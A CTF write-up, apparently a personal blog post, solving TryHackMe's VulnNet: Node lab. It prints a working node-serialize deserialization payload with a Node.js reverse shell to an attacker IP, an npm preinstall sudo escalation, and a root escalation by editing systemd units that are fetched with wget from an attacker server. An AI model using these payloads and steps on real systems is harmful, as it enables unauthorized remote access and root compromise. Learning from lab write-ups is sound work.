Time for another CTF write up. I very much enjoyed this one, which I did in collaboration with a colleague during a company knowledge sharing session.

Let's take a look at the [VulnNet: Node](https://tryhackme.com/room/vulnnetnode) CTF on TryHackMe.

## VulnNet

The first step was enumeration with `nmap`, which revealed a web application running on port 8080. This web app, based on the info by nmap, runs Node.js and the Express framework.

Upon checking out the page, there is a login, which isn't connected to a backend and some more static content. we tried enumerating it with `gobuster`, but couldn't find anything interesting.

One thing that caught our eye though, was the cookie. There is a `session` cookie with a base64 encoded value. Decoding this revealed some interesting JSON.

We played around with the JSON, setting the `username` to `Admin` and setting several flags, such as `isLoggedIn: true` and such. However, the only interesting thing coming out of that, was that the username seemed to be reflected on the main page.

Then we thought "what happens if we break it?" and put in invalid JSON. Interestingly, an exception was thrown and the stacktrace was visible on the page. One thing that stood out to me was the use of [node-serialize](https://www.npmjs.com/package/node-serialize). I used to develop in Node.js and built a few Express sites as well, but I never heard of this library.

Turns out, checking out the project's [GitHub repo](https://github.com/luin/serialize) revealed a big security warning, with an example of how to do remote code execution during the deserialization.

Very nice! We took the example and edited to include a reverse shell from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs), put into 1 line,  in the `username` property:

```javascript
{"username":"_$$ND_FUNC$$_function (){(function(){var net = require('net'),cp = require('child_process'),sh = cp.spawn('/bin/sh', []);var client = new net.Socket();client.connect(1234, '10.9.1.196', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});})();}()"}
```

We base64 this and then we can set it as the cookie.

Opening a local netcat listener and refreshing the site with the new cookie, we got our reverse shell!

We're logged in as the `www` user and, unfortunately, don't see the `user.txt` flag yet. However, we can see there is another user called `serv-manage`.

After looking around a bit and running [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/) to find privesc options, we saw that we're allowed to run `npm` as the `serv-manage` user.

Checking out [GTFOBins](https://gtfobins.github.io/gtfobins/npm/) revealed a possibility to exploit this, by creating a `package.json` file with a `preinstall` script, which opens a shell using `/bin/sh`.

So, we create a package.json with the following content:

```bash
echo '{"scripts": {"preinstall": "/bin/sh"}}' > package.json
```

Then, we simply run `sudo -u serv-manage /usr/bin/npm i` and voila, we are logged in as `serv-manage`, which had the `user.txt` flag right in their home folder for us to read.

The last step was to privilege escalate to root. Typing `sudo -l` revealed, that we're allowed to run several commands as root:

* `/bin/systemctl start vulnnet-auto.timer`
* `/bin/systemctl stop vulnnet-auto.timer`
* `/bin/systemctl daemon-reload`

Interesting - we can use this! Looking for the config files in `/etc/systemd/system/vulnnet-auto.timer` and `/etc/systemd/system/vulnnet-job.service` revealed the following two files:

```bash
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
```

and

```bash
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/df

[Install]
WantedBy=multi-user.target
```

The idea was to simply change the timer to run a lot more often (like every 5 seconds) using `OnCalendar=*:*:0/5` and, at the same time, changing the `vulnnet-job.service` to, instead of `/bin/df` copy the `/root/root.txt` into our home folder and giving us permissions to read it.

So we created these two replacement files locally and served them via an HTTP server, so we could fetch and replace them inside the `/etc/systemd/system/` folder.

We can fetch them like this:

```bash
wget -O vulnnet-job.service http://YOUR_IP/vulnnet-job.service
wget -O vulnnet-auto.timer http://YOUR_IP/vulnnet-auto.timer
```

The changed files look like this:

```bash
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:*:0/5
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
```

and 

```bash
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/cp /root/root.txt /home/serv-manage/root.txt && /bin/chown serv-manage:serv-manage /home/serv-manage/root.txt

[Install]
WantedBy=multi-user.target
```

After doing that, we simply called `daemon-reload`, followed by `stop` and `start` and we can read the flag in our home folder!

This step took us quite a bit of time, fiddling around with the systemd config files and finding out the order in which to call the `systemctl` commands, but in the end we were successful!

## Conclusion

What a fun CTF. I really liked the design of this one, as it featured somewhat realistic vulnerabilities and didn't go out of it's way to confuse or mislead the attacker.

Solving this was great fun and I'm looking forward to tackling the [new room by the author](https://tryhackme.com/room/vulnnetdotpy).

#### Resources

* [TryHackMe VulnNet: Node](https://tryhackme.com/room/vulnnetnode)
